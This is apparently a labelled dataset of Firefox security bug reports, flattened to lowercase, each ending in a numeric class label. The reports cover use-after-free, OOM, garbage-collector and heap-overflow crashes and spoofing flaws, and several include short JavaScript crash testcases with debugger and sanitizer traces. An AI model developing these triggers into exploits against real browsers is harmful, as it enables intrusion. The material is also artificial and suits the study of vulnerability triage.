nsformfillcontroller s mutationobserver handling is suspicious nsformfillcontroller uses mutationobserver for input.list but nothing if i read the code correctly enforces that mutationobserver is actually removed everything works usually ok but if list element gets moved to some other document and modified there there could be some sg crit crashes i think	11
nsdevicemotion devicemotionchanged may index out of bounds mwindowlisteners array the code dispatches dom events synchronously and dom event listeners can do anything like close windows as far as i see nothing guarantees that mwindowlisteners is still long enough when next iteration starts after event dispatch	11
oom crash nscomarray nsiselectionlistener operator due to unhandled alloc failure in nstypedselection notifyselectionlisteners tested on m-c revision 8ea5c983743f the code in nstypedselection notifyselectionlisteners does not properly handle an oom condition i assume it s while cloning selectionlisteners that leads to the following assertion and crash assertion nsvoidarray fastelementat index out of range 0 aindex aindex count file dist/include/nsvoidarray.h line 78 program received signal sigsegv segmentation fault nscomarray nsiselectionlistener operator this aindex=0 at dist/include/nscomarray.h:186 186 return objectat aindex 0 nscomarray nsiselectionlistener operator this aindex=0 at dist/include/nscomarray.h:186 1 in nstypedselection notifyselectionlisteners this at srv/repos/browser/mozilla-central/layout/generic/nsselection.cpp:5712 2 in nstypedselection endbatchchanges this optimized out at srv/repos/browser/mozilla-central/layout/generic/nsselection.cpp:5734 3 in nseditor dotransaction this atxn at srv/repos/browser/mozilla-central/editor/libeditor/base/nseditor.cpp:716 4 in nseditor insertnode this anode aparent aposition=0 at srv/repos/browser/mozilla-central/editor/libeditor/base/nseditor.cpp:1404 5 in createbogusnodeifneeded aselection this at srv/repos/browser/mozilla-central/editor/libeditor/text/nstexteditrules.cpp:1168 6 nstexteditrules createbogusnodeifneeded this aselection at srv/repos/browser/mozilla-central/editor/libeditor/text/nstexteditrules.cpp:1115 7 in init aeditor optimized out this at srv/repos/browser/mozilla-central/editor/libeditor/text/nstexteditrules.cpp:139 nscomarray nsiselectionlistener operator int const+73 mov rax rbx,8 rax rax 0 rbx 0 gdb f 1 1 in nstypedselection notifyselectionlisteners this at srv/repos/browser/mozilla-central/layout/generic/nsselection.cpp:5712 5712 nsiselectionlistener thislistener selectionlisteners i gdb p selectionlisteners 1 nscomarray_base marray mimpl no data fields the backtrace of the failing allocation is as follows 0 srv/repos/browser/mozilla-central/objdir-ff-gcc64dbg/dist/bin/libmozalloc.so moz_malloc 1 nsvoidarray sizeto int at objdir-ff-gcc64dbg/xpcom/build/nsvoidarray.cpp:231 2 nsvoidarray count const at xpcom/glue/nsvoidarray.h:67 3 nscomptr nsipresshell begin_assignment at objdir-ff-gcc64dbg/dist/include/nscomptr.h:1241 4 nstypedselection endbatchchanges at layout/generic/nsselection.cpp:5737 5 nseditor dotransaction nsitransaction at editor/libeditor/base/nseditor.cpp:702 6 nseditor insertnode nsidomnode nsidomnode int at editor/libeditor/base/nseditor.cpp:1404 7 nstexteditrules createbogusnodeifneeded nsiselection at editor/libeditor/text/nstexteditrules.cpp:1169 8 nstexteditrules init nsplaintexteditor at editor/libeditor/text/nstexteditrules.cpp:140 9 nsplaintexteditor endeditorinit at editor/libeditor/text/nsplaintexteditor.cpp:221 10 nsautoeditinitrulestrigger at editor/libeditor/text/nstexteditutils.cpp:123 11 nsplaintexteditor init nsidomdocument nsicontent nsiselectioncontroller unsigned int at editor/libeditor/text/nsplaintexteditor.cpp:159 12 nstexteditorstate prepareeditor nsastring_internal const at content/html/content/src/nstexteditorstate.cpp:1225 13 nstexteditorstate geteditor at content/html/content/src/nstexteditorstate.cpp:1010 14 ns_if_addref nsieditor at objdir-ff-gcc64dbg/dist/include/nsisupportsutils.h:93 15 srv/repos/browser/mozilla-central/objdir-ff-gcc64dbg/dist/bin/libxul.so ns_invokebyindex_p i m marking this as s-s for now because it s not clear to me what mselectionlisteners contains exactly especially if the attacker can control how many listeners are in there which could turn the crash into a controlled read however even in that case exploitation is likely very hard because creating a controlled oom in that location is surely not trivial	11
ensuremutable returns true success even when it failed due to oom tested on m-c revision 8ea5c983743f i do n't know exactly what s wrong here but the oom condition as indicated by the allocation trace below after crash trace led to this crash which looks potentially dangerous program received signal sigsegv segmentation fault nscontentutils asciitolower astr at srv/repos/browser/mozilla-central/content/base/src/nscontentutils.cpp:5042 5042 prunichar c iter gdb bt 8 0 nscontentutils asciitolower astr at srv/repos/browser/mozilla-central/content/base/src/nscontentutils.cpp:5042 1 in rulehash_cihashkey table optimized out key optimized out at srv/repos/browser/mozilla-central/layout/style/nscssruleprocessor.cpp:166 2 in pl_dhashtableoperate table key op=pl_dhash_add at srv/repos/browser/mozilla-central/objdir-ff-gcc64dbg/xpcom/build/pldhash.cpp:615 3 in rulehash appendruletotable this atable optimized out akey optimized out aruleinfo at srv/repos/browser/mozilla-central/layout/style/nscssruleprocessor.cpp:566 4 in rulehash appendrule this aruleinfo at srv/repos/browser/mozilla-central/layout/style/nscssruleprocessor.cpp:610 5 in addrule acascade aruleinfo at srv/repos/browser/mozilla-central/layout/style/nscssruleprocessor.cpp:2808 6 refreshrulecascade aprescontext optimized out this at srv/repos/browser/mozilla-central/layout/style/nscssruleprocessor.cpp:3148 7 nscssruleprocessor refreshrulecascade this aprescontext optimized out at srv/repos/browser/mozilla-central/layout/style/nscssruleprocessor.cpp:3095 gdb l 5037 nscontentutils asciitolower nsastring astr 5038 5039 prunichar iter astr.beginwriting 5040 prunichar end astr.endwriting 5041 while iter end 5042 prunichar c iter 5043 if c a c z 5044 iter c a a 5045 5046 iter gdb p iter 1 prunichar gdb p iter can not access memory at address gdb p end 2 prunichar the backtrace of the failing allocation is as follows 0 srv/repos/browser/mozilla-central/objdir-ff-gcc64dbg/dist/bin/libmozalloc.so moz_malloc 1 nsstringbuffer alloc unsigned long at xpcom/string/src/nssubstring.cpp:210 2 nsastring_internal mutateprep unsigned int unsigned short unsigned int at xpcom/string/src/nstsubstring.cpp:163 3 nsastring_internal replaceprepinternal unsigned int unsigned int unsigned int unsigned int at xpcom/string/src/nstsubstring.cpp:199 4 nsastring_internal assign unsigned short const unsigned int at xpcom/string/src/nstsubstring.cpp:335 5 nsastring_internal assign unsigned short const unsigned int at xpcom/string/src/nstsubstring.cpp:331 6 nsastring_internal ensuremutable unsigned int at xpcom/string/src/nstsubstring.cpp:295 7 nsastring_internal beginwriting at objdir-ff-gcc64dbg/content/base/src dist/include/nstsubstring.h:159 8 nscontentutils asciitolower nsastring_internal at content/base/src/nscontentutils.cpp:5040 9 rulehash_cihashkey at layout/style/nscssruleprocessor.cpp:167 10 pl_dhashtableoperate at objdir-ff-gcc64dbg/xpcom/build/pldhash.cpp:616 11 addselector at layout/style/nscssruleprocessor.cpp:2742 12 addrule at layout/style/nscssruleprocessor.cpp:2848 13 nscssruleprocessor getrulecascade nsprescontext at layout/style/nscssruleprocessor.cpp:3089 14 nscssruleprocessor rulesmatching anonboxruleprocessordata at layout/style/nscssruleprocessor.cpp:2320 15 enumrulesmatching anonboxruleprocessordata at layout/style/nsstyleset.cpp:479 if you need longer traces more gdb information or a reproduction of this let me know guessing layout as component but not sure about that of course	11
crash in nshtml5treebuilder assertion the unicode decoder wrote too much data end ns_html5_stream_parser_read_buffer_size assertion the decoder signaled an error other than ns_error_illegal_input convresult ns_error_illegal_input 1 perhaps reload 2 crash nightly/13 i ca n't reproduce with aurora/12 or beta/11 assertion the unicode decoder wrote too much data end ns_html5_stream_parser_read_buffer_size file work/mozilla/builds/nightly/mozilla/parser/html/nshtml5streamparser.cpp line 829 assertion the decoder signaled an error other than ns_error_illegal_input convresult ns_error_illegal_input file work/mozilla/builds/nightly/mozilla/parser/html/nshtml5streamparser.cpp line 836 mac os x 10.5 bp-d4c07014-dc00-4446-9f2d-f27532120306 firefox 13.0a1 crash report small_free_list_remove_ptr small_malloc_from_free_list szone_malloc bp-1cdb6ee0-3e92-4686-8a82-bb2d72120306 firefox 13.0a1 crash report small_free_list_remove_ptr szone_free free nshtml5dataavailable nshtml5dataavailable windows xp bp-fafa95bc-780e-4162-a0e0-7d8cd2120306 firefox 13.0a1 crash report nshtml5treebuilder flushcharacters windows 7 bp-f10abc9a-e10d-4d73-aaa5-99d232120306 firefox 13.0a1 crash report rtlentercriticalsection on windows 7 with a debug build i saw assertion failure local script nfixed at c work/mozilla/builds/nightly/moz illa/js/src/jsanalyze.cpp:186 and in crash automation on mac os x 10.6 i saw assertion failure ptrbits 0 operating system mac os x 10.6.8 10k549 cpu amd64 family 6 model 23 stepping 10 2 cpus crash reason exc_bad_access kern_invalid_address crash address thread 0 crashed 0 libmozglue.dylib moz_crash assertions.cpp 76 rbx r12 r13 r14 r15 rip rsp rbp found by given as instruction pointer in context 1 libmozglue.dylib moz_assert assertions.cpp 88 rbx r12 r13 r14 r15 rip rsp rbp found by call frame info 2 xul jsval_to_object_impl jsval.h 766 rbx r12 r13 r14 r15 rip rsp rbp found by call frame info 3 xul js value toobject jsapi.h 544 rbx r12 r13 r14 r15 rip rsp rbp found by call frame info 4 xul js gcmarker processmarkstacktop jsgcmark.cpp 1090 rbx r12 r13 r14 r15 rip rsp rbp found by call frame info 5 xul js gcmarker drainmarkstack jsgcmark.cpp 1172 rbx r12 r13 r14 r15 rip rsp rbp found by call frame info 6 xul markandsweep jsgc.cpp 3293 rbx r12 r13 r14 r15 rip rsp rbp found by call frame info 7 xul gccycle jsgc.cpp 3644 rbx r12 r13 r14 r15 rip rsp rbp found by call frame info s-s due to all of the various crashes related to memory and gc	11
opt-only crash js gc markinternal the following test crashes on mozilla-central revision 7d0d1108a14e options m n a 32 bit optimized only function insection x function printstatus msg function reportcompare expected actual description var expected_t typeof expected var actual_t typeof actual printstatus expected type expected_t matched actual type actual_t new function var actual var expect var date1 var date2 var validdatestrings 11/69/2004 var invaliddatestrings 70/70/70 70/70/1970 70/70/2004 for i 0 i validdatestrings.length i date1 new date validdatestrings i date2 new date date1.todatestring actual date2 date1 var offset validdatestrings.length for i 0 i invaliddatestrings.length i date1 new date invaliddatestrings i i isnan date1 reportcompare expect actual insection i offset invaliddatestrings i 3 crash trace 53139 invalid read of size 4 53139 at void js gc markinternal jsstring jstracer jsstring jsgcmark.cpp:105 53139 by js gc markvaluerootrange jstracer unsigned int js value char const jsgcmark.cpp:321 53139 by js stackspace markframeslots jstracer js stackframe js value unsigned char jsgcmark.h:114 53139 by js stackspace mark jstracer stack.cpp:521 53139 by zn2jsl11markruntimeep8jstracerb.clone.224 jsgc.cpp:2397 53139 by beginmarkphase jsruntime jsgc.cpp:2990 53139 by gccycle jscontext jscompartment long long js jsgcinvocationkind jsgc.cpp:3289 53139 by collect jscontext jscompartment long long js jsgcinvocationkind js gcreason reason jsgc.cpp:3707 53139 by js_handleexecutioninterrupt jscontext jscntxt.cpp:856 53139 by in srv/repos/mozilla-central/js/src/opt32/shell/js 53139 address is not stack d malloc d or recently free d	11
plugins can be fooled by window.location again looks like we regressed cve-2010-0170 bug 541530 some time ago probably with compartments we ve theoretically got test coverage for it unfortunately the test coverage gets fooled when window.location.__definegetter does n't exist and incorrectly concludes that the object is immutable but we can easily do window.__definegetter__.apply window.location and do the same thing ruh roh testcase attached i discovered this when i broke this test with my location wrapper changes in compartment-per-global and started wondering how we currently deal with the problem i already need to change this stuff around to work right with my compartment-per-global changes so i think the safest and most discrete approach is for me to just fix it there bug 733984 and then backport to branches later if need be thoughts	11
crash nscssframeconstructor processpendingrestyles about 50 of the time this testcase causes a crash in nscssframeconstructor processpendingrestyles	11
crash nsdomstorage getnameditem with sessionstorage gc 1 install 2 load the testcase 3 click the button result firefox crashes in one of the following ways nsdomstorage getnameditem calling a random address nsdomstorage cachestoragepermissions accessing null	11
malloc error with arraybuffer uint32array and uint8array try a arraybuffer 76 b uint32array a uneval c uint8array a c.set b catch e crashes js debug and opt shell on m-c changeset c7ef262e3024 with a malloc error tested on 32-bit malloc error for object incorrect checksum for freed object object was probably modified after being freed set a breakpoint in malloc_error_break to debug s-s because malloc errors seem scary a valgrind log is attached	11
possible exploitable crashes with low memory nsinodeinfo nodeinfomanager with js mjit entermethodjit on the stack 1 2 consume cpu and ram until you crash assertion inserting node that already has parent akid getnodeparent file c work/mozilla/builds/nightly/mozilla/cont ent/base/src/nsgenericelement.cpp line 3757 crashes nightly/14 aurora/13 beta/12 firefox/11 on windows xp and windows 7 firefox/11 bp-9c5f6e84-81d0-49ff-83f4-385fd2120319 empty no crashing thread identified corrupt dump nightly/14 bp-6d234ff4-7365-4282-8f8b-db3ca2120319 empty no crashing thread identified corrupt dump operating system windows nt 6.1.7601 service pack 1 cpu x86 genuineintel family 6 model 37 stepping 1 2 cpus crash reason exception_access_violation_exec crash address thread 0 crashed 0 eip esp ebp ebx esi edi eax ecx edx efl found by given as instruction pointer in context note the heap fenceposts and the deleted memory other reports show which is freed heap memory from heapfree common pattern in all reports so far is ecx running under windbg i crash at nsinodeinfo nodeinfomanager more reports are available in bughunter	11
2d texture corruption on mac/intel with large texture sizes 4993 when i go to and click on the image to view details check the file i attached to see what happens hardware info 11 macbook air mid 2011 graphics intel hd graphics 3000 384 mb software mac os x lion 10.7.3 11d50b running firefox 11.0	11
assertion failure thing at js/src/jsgcmark.cpp:7 or crash js gc markinternal the following test asserts/crashes on mozilla-central revision 58a2cd0203ee options m n a evalcx for var i 0 i 1000 i a i i function foo x for var i in x var summary basic support for iterable objects and for-in schedulegc 1234 foo a crash trace 8882 invalid read of size 8 8882 at void js gc markinternal jsstring jstracer jsstring jsgc.h:674 8882 by js gc markidinternal jstracer long jsgcmark.cpp:275 8882 by js gc markidrootrange jstracer unsigned long long char const jsgcmark.cpp:314 8882 by js autogcrooter trace jstracer jsgc.cpp:2280 8882 by js autogcrooter traceall jstracer jsgc.cpp:2320 8882 by zn2jsl11markruntimeep8jstracerb.clone.239 jsgc.cpp:2336 8882 by beginmarkphase jsruntime jsgc.cpp:2989 8882 by gccycle jscontext jscompartment long js jsgcinvocationkind jsgc.cpp:3295 8882 by collect jscontext jscompartment long js jsgcinvocationkind js gcreason reason jsgc.cpp:3739 8882 by js gc rundebuggc jscontext jsgc.cpp:3760 8882 by zn2js2gc10newgcthingi8jsstringeept_p9jscontextns0_9allockindem.clone.228 jsgcinlines.h:415 8882 by js_newstringcopyn jscontext unsigned short const unsigned long jsgcinlines.h:474 8882 address is not stack d malloc d or recently free d i confirmed this is not bug 733979 or at least this issue is not fixed by the patch in that bug assuming s-s and sg critical due to gc-related crash at non-zero address	11
oom crash nsqueryinterfacewitherror operator trying to execute random memory this bug was initially created as a clone of bug 733047 tested on m-c revision 08809a43e082 during oom testing for bug 737129 i got a crash shown in the attached log the trace is very similar to that in bug 733047 but we re not trying to execute null here but random memory the log shows 6 failed allocations before the crash and the crash location address varies i had bad and can not access memory at as well as random instructions could it be that one of the failed allocations leaves a pointer uninitialized here	11
assertion failure infer failure missing type pushed 0 mllist.prototype function asserts js debug shell on m-c changeset 92fe907ddac8 with m a and n at assertion failure infer failure missing type pushed 0 s-s because infer failures are bad assuming worse case sg critical autobisect shows this is probably related to the following changeset the first bad revision is changeset 76042 b769a2b79e6b user brian hackett date fri jul 15 10:14:07 2011 0700 summary infer lazily create type objects for singleton js objects bug 670185	11
redirect to an https resource that returns an atom/rss content type with an invalid body causes the site identity block to show the resource s identity for the source s content user agent mozilla/5.0 windows nt 5.1 rv:9.0.1 gecko/20100101 firefox/9.0.1 build id 20111220165912 steps to reproduce i created a test phishing page at the bottom of it i put a small piece of javascript that redirects to an https twitter api page that replies with an http error code and xml content i then opened the test phishing page in firefox the exact http error code does not seem to matter it works at least with 404 and 500 on the other hand the xml content in the http error body seems to be necessary actual results the certificate of the https error page is now shown on my phishing page expected results the error from twitter should be displayed and the address in the address bar should indicate the address of the error page	9
js_clonescript does not preserve principals for nested functions js_clonescript that was introduced in the bug 584789 only preserves the principals for the script itself and keeps the principals for all nested functions and their scripts set to null	11
investigate if listbase lc finalize should use deferred release i was trying to understand how new nodelist bindings work and noticed that release may happen in finalize is it possible that it may cause similar problems as what bug 712448 caused	11
security ui needs to stop assuming that bytes transferred bytes rendered it s quite possible for data to be transferred but not rendered e.g when stream converters of any sort including the unknown decoder are involved the security ui code will treat data being transferred as a signal to update security state this means it s possible to leave the browser rendering page a while the security ui shows the state for page b this is obviously bad bug 714631 had a specific instance of this that i papered over but this is a general problem that needs fixing if we need to expose more information from docshell or necko or the dom to the security ui we should just do that as needed	11
assertion did n't restore state properly assertion please remove this from the document properly isindoc file content/base/src/nsgenericelement.cpp line 2509 this assertion is covered by bug 718282 assertion did n't restore state properly msubtreeroot this file content/base/src/nsgenericelement.cpp line 210 this assertion was added in bug 730587	11
assertion js failed without setting an exception with settimeout javascript error line 0 permission denied for file to call method xulelement.queryinterface assertion js failed without setting an exception js_isexceptionpending cx file js/src/xpconnect/src/xpcwrappedjsclass.cpp line 323 security-sensitive because there seems to be some context or privilege confusion did a the file url really get its hands on a xulelement	11
unmarkgraychildren is unsafe in presence of the background finalization thread unmarkgraychildren 609 recursively calls js_tracechildren to unmark the gray objects however this is not safe if the background finalization thread is running the problem comes from the usage of the conservative marking calls like markstackrangeconservatively 1139 when navigating the object graph under js_tracechildren as that call checks an address against the gc chunk table and other gc data structures to verify for live gc things it is important that the those data structures are not freed however with the background finalization thread running this is violated for example it is possible that the background thread manages to finalize and release the gc chunk for gc thing that markstackrangeconservatively just finds and tries to mark after that the memory range corresponding to the chunk can be allocated and filled from other threads then the gc graph traversal may call a function through a pointer stored in that filled memory	11
signed mar files are not version checked and can be used to downgrade an install although mar files will be signed as part of bug 699700 the version of the application is not part of the mar file itself this means a legitimately signed but older mar file can be used to downgrade an install of an application there are other checks around mar files a sha-512 hash of the mar is downloaded over ssl and used to verify the mar file downloaded over http was not tampered with circumventing this protection would require compromising the update server s ssl session via either attacking the server and its private key directly or forging/hijacking a cert that would be trusted for the ssl session	11
possibly missing unmarkgray in a few places i m not sure if these are correct but it seems like we could be missing unmarkgray calls in a few places	11
arm assertion failure lastresort framestate invalidindex at methodjit/immutablesync.cpp:133 or crash jsc armassembler namegpreg the following test asserts on mozilla-central revision 0b4c58200e3a options m n a function fannkuch n var perm1 array n while true if check 30 for var i=0 i n i s perm1 i 1 tostring while i r var j this.abstract 1 perm1 i perm1 j fannkuch 8 s-s because this triggers quite a few additional assertions when continuing and then crashes program received signal sigsegv segmentation fault in jsc armassembler namegpreg reg=-1 at assembler/assembler/armassembler.h:1233 1233 assert reg 0 gdb bt 0 in jsc armassembler namegpreg reg=-1 at assembler/assembler/armassembler.h:1233 1 in jsc armassembler dtr_u this isload=true rd=-1 rb=10 offset=64 cc=jsc armassembler al at assembler/assembler/armassembler.h:651 2 in jsc armassembler datatransfer32 this isload=true srcdst=4294967295 base=jsc armregisters r10 offset=64 at home/decoder/mozilla-central/js/src/assembler/assembler/armassembler.cpp:356 3 in jsc macroassemblerarm load32 this address dest=4294967295 at assembler/assembler/macroassemblerarm.h:303 4 in js mjit nunboxassembler loadpayload jsc abstractmacroassembler jsc armassembler address this address reg=4294967295 at home/decoder/mozilla-central/js/src/methodjit/nunboxassembler.h:134 5 in js mjit immutablesync ensuredatareg this fe e at home/decoder/mozilla-central/js/src/methodjit/immutablesync.cpp:222 6 in js mjit immutablesync synccopy this fe at home/decoder/mozilla-central/js/src/methodjit/immutablesync.cpp:244 7 in js mjit immutablesync sync this fe at home/decoder/mozilla-central/js/src/methodjit/immutablesync.cpp:179 8 in js mjit framestate syncfancy this masm avail trackerindex=5 at home/decoder/mozilla-central/js/src/methodjit/framestate.cpp:1280 9 in js mjit framestate sync this masm uses at home/decoder/mozilla-central/js/src/methodjit/framestate.cpp:1382 10 in js mjit stubcompiler syncexit this uses at home/decoder/mozilla-central/js/src/methodjit/stubcompiler.cpp:83 11 in js mjit stubcompiler linkexit this j uses at home/decoder/mozilla-central/js/src/methodjit/stubcompiler.cpp:120 12 in js mjit compiler jsop_setelem this popguaranteed=true at home/decoder/mozilla-central/js/src/methodjit/fastops.cpp:1592 13 in js mjit compiler generatemethod this at home/decoder/mozilla-central/js/src/methodjit/compiler.cpp:2046 14 in js mjit compiler performcompilation this jitp at home/decoder/mozilla-central/js/src/methodjit/compiler.cpp:539 15 in js mjit compiler compile this at home/decoder/mozilla-central/js/src/methodjit/compiler.cpp:157 16 in js mjit trycompile cx script construct=false at home/decoder/mozilla-central/js/src/methodjit/compiler.cpp:647 17 in js mjit canmethodjit cx script construct=false request=js mjit compilerequest_interpreter at home/decoder/mozilla-central/js/src/methodjit/methodjit-inl.h:77 18 in js interpret cx entryframe interpmode=js jsinterp_normal at home/decoder/mozilla-central/js/src/jsinterp.cpp:3046 19 in js mjit entermethodjit cx fp code stacklimit partial=false at home/decoder/mozilla-central/js/src/methodjit/methodjit.cpp:1079 gdb x 2i pc jsc armassembler namegpreg int 100 str r2 r3 0 jsc armassembler namegpreg int 102 mov.w r3 0 gdb info register r2 r3 r2 0 r3 3148725999 judging the assert/crash with my professional js developer skills d this could be a register allocation problem during compilation	11
liveness analysis makes mistakes when analyzing try/catch this was basically a mistake over the meaning of some arguments to the lifetime constructor i think the fix is simple most of the work of writing this patch was in figuring out the meaning of the savedend field so i tried to improve the comment describing it let me know if you have any ideas for this i do n't understand precisely how the jit uses this information so i decided to be conservative and close the bug	11
black-gray edges due to shapes in unmarkgraychildren this is another instance of the use after unlink problem described in bug 690970 where a black-gray edge can cause the cycle collector to think something is dead when it is alive and call unlink on it this probably only can causes null derefs but unlink functions are written by hand in c so who knows a shape can hold onto a non-shape but unmarkgraychildren stops if it reaches a shape thus there can be an edge from a black object to a gray shape we ca n't just remove this check because it may cause the stack limit to be hit more often which will trigger gcs more often instead we need to use js_traceshapecyclecollectorchildren	11
js oom testing invalid free in jsobject makedensearrayslow the following command crashes on mozilla-central revision 13b571bde26a js a 380 f js/src/jit-test/shell.js f js/src/jit-test/tests/jaeger/bug709067.js i m getting a glibc abort here glibc detected debug64/js free invalid pointer backtrace lib/x86_64-linux-gnu/libc.so.6 lib/x86_64-linux-gnu/libc.so.6 cfree in valgrind 6766 invalid free delete delete 6766 at free vg_replace_malloc.c:366 6766 by js_free utility.h:152 6766 by js foreground free void utility.h:566 6766 by jsruntime free void jscntxt.h:640 6766 by jscontext free void jscntxt.h:1126 6766 by jsobject makedensearrayslow jscontext jsarray.cpp:1392 6766 by array_setgeneric jscontext jsobject jsid js value int jsarray.cpp:914 6766 by jsobject nonnativesetproperty jscontext jsid js value int jsobj.cpp:3124 6766 by jsobject setgeneric jscontext jsid js value int jsobjinlines.h:162 6766 by js setobjectelementoperation jscontext jsobject jsid js value const jsinterpinlines.h:829 6766 by js interpret jscontext js stackframe js interpmode jsinterp.cpp:2640 6766 by js runscript jscontext jsscript js stackframe jsinterp.cpp:454 6766 address is 0 bytes inside data symbol zl17emptyobjectheader at first glance it looks like some pointer arithmetic magic going wrong in jsobj.h null pointer likely from oom is added to elements size to form a new pointer that is freed if the size is controllable and i assume it will be somehow then this is exploitable if the attacker can force oom for the script in the right moment	11
assertion failure enumerators cx enumerators at jsinterp.cpp:453 or crash js_suppressdeletedproperty the following test asserts/crashes on mozilla-central revision dfcb11712ec2 options m n var lfcode new array lfcode.push function fatty try fatty catch e for each foo in 1 fatty lfcode.push gc lfcode.push while true var file lfcode.shift if file undefined break evaluate file crash trace 63414 invalid read of size 1 63414 at js_suppressdeletedproperty jscontext jsobject long jsiter.cpp:1002 63414 by js array_shift jscontext unsigned int js value jsarray.cpp:2559 63414 by js invokekernel jscontext js callargs js maybeconstruct jscntxtinlines.h:314 63414 by js interpret jscontext js stackframe js interpmode jsinterp.cpp:2710 63414 by js execute jscontext jsscript jsobject js value jsinterp.cpp:668 63414 by js_executescript jsapi.cpp:5275 63414 by process jscontext jsobject char const bool js.cpp:478 63414 by shell jscontext js cli optionparser char js.cpp:4751 63414 by main js.cpp:5044 63414 address is not stack d malloc d or recently free d possibly related to bug 734987 i m marking this s-s because the bug requires gc although the crash looks like a null-pointer crash please triage and remove s-s if appropriate	11
possible race condition when launching updates from service after security checks james forshaw wrote if ff is installed to a non-standard directory does the updater service get installed to a secure directory elsewhere or does it not get installed at all or does it get installed along side and relating to the patch attached to this post that fix for the race is not quite correct for at least two reasons 1 the attacker need not provide a path to a file system which honors the write locking for example if he pointed it to a unc path then he could change it on the remote server and windows could return the new data at loadlibrary time 2 the semantics of loadlibrary differ from createfile when it comes to paths for example there is no checking done to make the path absolute so if you provide a relative path then loadlibrary could search the path first an unlikely condition but probably more importantly if you supply a filename with no extension then loadlibrary always appends dll to the filename before loading createfile will open the name as is	11
use-after-free in nsinode replaceorinsertbefore use-after-free is triggered during replacing/inserting node in document crashes on 14.0a1 ubuntu 11.11 linux x86-64 15.0a1 windows 7 x86-64 12.0 windows xp sp3 does not crash on 10.0.2 attached test-case is a bit flaky but it will crash browser after 2-5 reloads asan log is from version 14.0a1	11
heap-buffer-overflow in utf16_to_isolatin1 user agent mozilla/5.0 windows nt 6.1 wow64 applewebkit/535.11 khtml like gecko chrome/17.0.963.83 safari/535.11 steps to reproduce i ran the attached testcase on asanified firefox beta 12.0 and firefox aurora 13.0a2 and got this crash the testcase reproduces reliably on slower bots 22842 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 2 at thread t0 0 in utf16_to_isolatin1 firefox/beta-src/xpcom/io/nsnativecharsetutils.cpp:123 1 in ns_copyunicodetonative nsastring_internal const nsacstring_internal firefox/beta-src/xpcom/io/nsnativecharsetutils.cpp:865 2 in nslocalfile initwithpath nsastring_internal const firefox/beta-src/xpcom/io/nslocalfileunix.cpp:1968 3 in net_getfilefromurlspec nsacstring_internal const nsifile firefox/beta-src/netwerk/base/src/nsurlhelperunix.cpp:121 4 in nsstandardurl ensurefile firefox/beta-src/netwerk/base/src/nsstandardurl.cpp:2546 5 in nsstandardurl getfile nsifile firefox/beta-src/netwerk/base/src/nsstandardurl.cpp:2553 6 in nsfilechannel opencontentstream bool nsiinputstream nsichannel firefox/beta-src/netwerk/protocol/file/nsfilechannel.cpp:315 7 in nsbasechannel beginpumpingdata firefox/beta-src/netwerk/base/src/nsbasechannel.cpp:240 8 in nsbasechannel asyncopen nsistreamlistener nsisupports firefox/beta-src/netwerk/base/src/nsbasechannel.cpp:609 9 in nsscriptloader startload nsscriptloadrequest nsastring_internal const firefox/beta-src/content/base/src/nsscriptloader.cpp:339 10 in nsscriptloader preloaduri nsiuri nsastring_internal const nsastring_internal const firefox/beta-src/content/base/src/nsscriptloader.cpp:1340 11 in nshtml5treeopexecutor preloadscript nsastring_internal const nsastring_internal const nsastring_internal const firefox/beta-src/parser/html/nshtml5treeopexecutor.cpp:940 12 in nshtml5speculativeload perform nshtml5treeopexecutor firefox/beta-src/parser/html/nshtml5speculativeload.cpp:67 13 in nshtml5treeopexecutor runflushloop firefox/beta-src/parser/html/nshtml5treeopexecutor.cpp:478 14 in nshtml5executorflusher run firefox/beta-src/parser/html/nshtml5streamparser.cpp:160 15 in ns_processnextevent_p nsithread bool firefox/beta-src/objdir-ff-asan/xpcom/build/nsthreadutils.cpp:245 16 in mozilla ipc messagepump run base messagepump delegate firefox/beta-src/ipc/glue/messagepump.cpp:110 17 in messageloop run firefox/beta-src/ipc/chromium/src/base/message_loop.cc:176 18 in nsbaseappshell run firefox/beta-src/widget/xpwidgets/nsbaseappshell.cpp:191 19 in do_main firefox/beta-src/browser/app/nsbrowserapp.cpp:205 20 in main firefox/beta-src/browser/app/nsbrowserapp.cpp:295 21 in libc_start_main build/buildd/eglibc-2.11.1/csu/libc-start.c:258 is located 0 bytes to the right of 262-byte region allocated by thread t0 here 0 in malloc 1 in nsstringbuffer alloc unsigned long firefox/beta-src/xpcom/string/src/nssubstring.cpp:209 2 in nsastring_internal setcapacity unsigned int firefox/beta-src/xpcom/string/src/nstsubstring.cpp:549 3 in nsastring_internal setlength unsigned int firefox/beta-src/xpcom/string/src/nstsubstring.cpp:579 22842 aborting stats 98m malloced 100m for red zones by 213591 calls stats 5m realloced by 10131 calls stats 68m freed by 115413 calls stats 0m really freed by 0 calls stats 220m 56351 full pages mmaped in 55 calls mmaps by size class 8:180213 9:32764 10:12285 11:12282 12:2048 13:1536 14:1280 15:256 16:512 17:128 18:64 19:8 20:4 21:2 mallocs by size class 8:159655 9:26841 10:10317 11:11443 12:1809 13:1402 14:1249 15:204 16:479 17:123 18:57 19:6 20:4 21:2 frees by size class 8:75941 9:18459 10:7803 11:9347 12:1445 13:636 14:1116 15:170 16:364 17:115 18:11 19:4 20:2 rfrees by size class stats malloc large 192 small slow 1306 shadow byte and word 6 06 fb fb fb fb fb fb fb more shadow bytes 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa	11
we should not trust the driver to not overflow in webgl uniform array setters currently in the implementation of uniform array setters we are happily passing too-long array sizes to gluniformxxv and relying the the specified behavior that anything that falls outside array boundaries gets silently ignored so a call like this gl.uniform4fv univ4 1 2 3 4 5 6 7 8 results in a gl call like this gluniform4fv location 2 ptr and we are not checking that the uniform array is really of size 2 we are relying on the gl to check that instead we should clamp these sizes ourselves that requires knowing what the real array sizes are angle gives us that and we re already querying that shgetactiveuniform in compileshader we just need to store these values somewhere and use them	11
